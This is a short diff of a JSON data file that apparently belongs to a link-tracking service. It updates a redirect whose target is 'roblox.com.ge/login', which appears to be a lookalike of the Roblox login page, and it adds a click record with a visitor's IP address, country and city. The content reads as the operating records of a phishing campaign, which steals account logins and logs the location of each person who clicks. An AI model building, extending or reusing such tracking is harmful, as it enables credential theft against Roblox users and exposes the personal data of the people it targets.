@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1144,
+    "useCount": 1145,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9291,6 +9291,14 @@
       },
       {
         "timestamp": 1777278652901,
+        "ip": "112.208.66.65",
+        "country": "Philippines",
+        "city": "Cebu City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777278658112,
         "ip": "112.208.66.65",
         "country": "Philippines",
         "city": "Cebu City",
